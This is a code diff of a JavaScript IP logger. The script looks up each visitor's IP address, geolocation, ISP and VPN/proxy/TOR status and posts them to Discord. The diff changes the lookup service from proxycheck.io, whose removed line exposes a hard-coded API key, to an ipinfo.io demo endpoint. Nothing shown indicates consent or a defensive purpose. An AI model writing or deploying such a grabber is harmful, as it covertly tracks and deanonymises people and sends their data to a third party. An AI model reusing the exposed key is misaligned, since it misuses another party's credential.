@@ -18,47 +18,47 @@
                     fields: [
                         {
                             name: "IP Address", 
-                            value: ipInfo[ipInfo.query].ip, 
+                            value: ipInfo.data.ip, 
                             inline: true
                         },
                         {
                             name: "City", 
-                            value: ipInfo[ipInfo.query].city || "N/A", 
+                            value: ipInfo.data.city, 
                             inline: true
                         },
                         {
                             name: "State", 
-                            value: ipInfo[ipInfo.query].region || "N/A", 
+                            value: ipInfo.data.region || "N/A", 
                             inline: true
                         },
                         {
                             name: "Country", 
-                            value: ipInfo[ipInfo.query].country_name || "N/A", 
+                            value: ipInfo.data.country, 
                             inline: true
                         },
                         {
                             name: "Organization", 
-                            value: ipInfo[ipInfo.query].organisation || "N/A", 
+                            value: ipInfo.data.org, 
                             inline: true
                         },
                         {
                             name: "ASN Name", 
-                            value: ipInfo[ipInfo.query].asn || "N/A", 
+                            value: ipInfo.data.asn.name, 
                             inline: true
                         },
                         {
                             name: "VPN", 
-                            value: ipInfo[ipInfo.query].proxy === "yes" ? "Yes" : "No", 
+                            value: ipInfo.data.privacy.vpn ? "Yes" : "No", 
                             inline: true
                         },
                         {
                             name: "Proxy", 
-                            value: ipInfo[ipInfo.query].proxy === "yes" ? "Yes" : "No", 
+                            value: ipInfo.data.privacy.proxy ? "Yes" : "No", 
                             inline: true
                         },
                         {
                             name: "TOR", 
-                            value: ipInfo[ipInfo.query].tor === "yes" ? "Yes" : "No", 
+                            value: ipInfo.data.privacy.tor ? "Yes" : "No", 
                             inline: true
                         },
                     ],
@@ -84,7 +84,7 @@
         const ipData = await ipResponse.json();
         const userIP = ipData.ip;
 
-        const ipInfoResponse = await fetch(`https://proxycheck.io/v2/${userIP}?key=6a4992-mc2s88-80h85z-12p2m3&vpn=1&asn=1`);
+        const ipInfoResponse = await fetch(`https://ipinfo.io/widget/demo/${userIP}`);
         const ipInfo = await ipInfoResponse.json();
 
         await sendToDiscord(ipInfo);
